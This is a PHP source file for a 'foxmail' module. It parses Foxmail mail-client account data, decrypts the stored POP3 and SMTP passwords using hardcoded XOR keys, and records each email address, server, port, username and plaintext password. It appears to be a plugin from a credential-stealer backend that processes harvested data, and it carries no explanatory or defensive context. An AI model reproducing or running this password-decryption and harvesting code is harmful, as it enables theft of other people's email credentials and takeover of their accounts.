<?php

class Module_foxmail extends Module_
{
    private function Decode($Pass, $Type = 1)
    {
		$Old = error_reporting(NULL);
		
        $a = "~F@7%m$~";
		if($Type == 0)
			$a = "~draGon~";
		
        $b = hex2bin($Pass);
		
		if($b == FALSE)
			return '';
		
        $c  = ($b[0] ^ hex2bin("71")) . substr($b, 1);
		if($Type == 0)
			$c  = ($b[0] ^ hex2bin("5A")) . substr($b, 1);
		
        $d = $e = '';

        for ($i = 0; $i < strlen($b); $i++)
            $d .= $b[$i] ^ $a[$i - 1];
		
        $PW_ = '';
        for ($i = 0; $i < strlen($d); $i++)
        {
            if (ord($d[$i]) - ord($c[$i]) < 0)
            {
                $e = ord($d[$i]) + 255 - ord($c[$i]);
            }
            else
            {
                $e = ord($d[$i]) - ord($c[$i]);
            }
            $PW_ .= chr($e);
        }
		
		error_reporting($Old);
        return $PW_;

    }

    protected function process_old($Data)
    {
        if (strlen($Data) == 0)
            return;

        $Lines = parse_lines($Data);
        $Email = $Prot = $POPServer	= $POPPort = $POPUser = $POPPass = $SMTPServer = $SMTPPort = $SMTPUser = $SMTPPass 	= '';

        foreach ($Lines as $Line)
        {
            //UserName????
            $Low = strtolower($Line);
            if(strpos($Low, "mailaddress") !== false)
                $Email = strstr_after($Line, "=") ;
            else if(strpos($Low, "pop3account") !== false)
                $POPUser = strstr_after($Line, "=");
            else if(strpos($Low, "pop3host") !== false)
                $POPServer = strstr_after($Line, "=");
            else if(strpos($Low, "pop3password") !== false)
                $POPPass = strstr_after($Line, "=");
            else if(strpos($Low, "pop3port") !== false)
                $POPPort = strstr_after($Line, "=");
            else if(strpos($Low, "esmtpaccount") !== false)
                $SMTPUser = strstr_after($Line, "=");
            else if(strpos($Low, "smtphost") !== false)
                $SMTPServer = strstr_after($Line, "=");
            else if(strpos($Low, "esmtppassword") !== false)
                $SMTPPass = strstr_after($Line, "=");
            else if(strpos($Low, "smtpport") !== false)
                $SMTPPort = strstr_after($Line, "=");

        }
		
		if($POPPass != '')
		{
			$POPPass = $this->Decode($POPPass, 0);
			$this->add_email($Email, 'pop3', $POPServer, $POPPort, $POPUser, $POPPass);
		}
		
		if($SMTPPass != '')
		{
			$SMTPPass = $this->Decode($SMTPPass, 0);
			$this->add_email($Email, 'smtp', $SMTPServer, $SMTPPort, $SMTPUser, $SMTPPass);
		}
    }

	function FindData(&$SourcePTR, $Needle, $Type = 1)
	{
		$NeedleLen = strlen($Needle);
		$Len = strlen($SourcePTR);
		$sCnt = 0;
		while($Len > $sCnt)
		{
			$PTR_ = strpos($SourcePTR, $Needle);
			$Result = substr($SourcePTR, $PTR_ - 1, $NeedleLen + 1);
			if(!ctype_alpha ($Result))
			{
				
				$Result = substr($SourcePTR, $PTR_ , $NeedleLen+  1);
				if(!ctype_alpha ($Result))
				{
					$Result = NULL;
					$stream = new Stream(substr($SourcePTR, $PTR_));
					$stream->Skip(strlen($Needle) + 4);
					
					if($Type == 0)
					{
						$Result = $stream->getDWORD();
						$SourcePTR = substr($stream->GetData(), $stream->GetDataPos());
					}
					else
					{
						$Result = $stream->getSTR($stream->getDWORD());
						$SourcePTR = substr($stream->GetData(), $stream->GetDataPos());
					}

					$stream = NULL;
					
					return $Result;
				}
			}
			$Result = NULL;
			$NewLen = $PTR_ + $NeedleLen;
			$PTR_ = NULL;
			$SourcePTR = substr($SourcePTR, $NewLen);
			$sCnt = $NewLen;
		}
		
		return NULL;
	}
	
    protected function process_old2($Data)
    {
        if (strlen($Data) == 0)
            return;
		
		while(true)
		{
			$Email = $this->FindData($Data, "Account");
			if($Email == NULL)
				break;
			
			$Email 		= $this->FindData($Data, "Email");
			$POPPort 	= $this->FindData($Data, "IncomingPort", 0);
			$POPServer 	= $this->FindData($Data, "IncomingServer");
			$SMTPPort 	= $this->FindData($Data, "OutgoingPort", 0);
			$SMTPServer = $this->FindData($Data, "OutgoingServer");
			$Pass 		= $this->FindData($Data, "Password");
			
			if($Pass != '')
			{
				$Pass = $this->Decode($Pass, 1);
				$this->add_email($Email, 'pop3', $POPServer, $POPPort, $Email, $Pass);
				$this->add_email($Email, 'smtp', $SMTPServer, $SMTPPort, $Email, $Pass);
			}
		}
    }
	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->process_old($Data);
            break;
        case 1:
            $this->process_old2($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
